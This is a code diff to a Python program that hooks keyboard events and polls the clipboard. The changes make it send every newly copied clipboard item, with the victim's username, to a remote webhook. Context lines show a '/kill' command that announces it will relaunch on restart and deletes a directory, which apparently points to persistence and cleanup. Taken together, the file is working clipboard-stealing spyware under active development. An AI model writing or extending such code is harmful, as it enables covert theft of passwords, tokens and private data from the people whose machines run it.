@@ -93,11 +93,17 @@ def on_press(key):
 
 def on_release(key):
     global last_clipboard
-    # Don't perform any action until a significant clipboard change is detected
-    current_clipboard = pyperclip.paste()
+    try:
+        # Check if clipboard has changed
+        current_clipboard = pyperclip.paste()
 
-    if current_clipboard != last_clipboard:
-        last_clipboard = current_clipboard
+        # If clipboard content has changed, send it to the webhook
+        if current_clipboard != last_clipboard:
+            last_clipboard = current_clipboard
+            send_to_webhook(f"{username} just copied something to clipboard!")
+            send_to_webhook(f"Clipboard content: {current_clipboard}")
+
+        # Handle the /kill or /remove clipboard commands
         if "/kill" in current_clipboard:
             send_to_webhook(f"Kill command executed by: {username}")
             send_to_webhook("Launching again on restart.")
@@ -113,7 +119,11 @@ def on_release(key):
                 send_to_webhook(f"Error removing directory: {e}")
             return False
 
+    except Exception as e:
+        print(f"Error accessing clipboard: {e}")
+
     return True
+
 
 def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
@@ -122,10 +132,13 @@ def monitor_clipboard():
         time.sleep(1)
         try:
             current_clipboard = pyperclip.paste()
+
+            # If clipboard content has changed, send it to the webhook
             if current_clipboard != last_clipboard:
+                last_clipboard = current_clipboard
                 send_to_webhook(f"{username} just copied something to clipboard!")
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
-                last_clipboard = current_clipboard
+
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
 
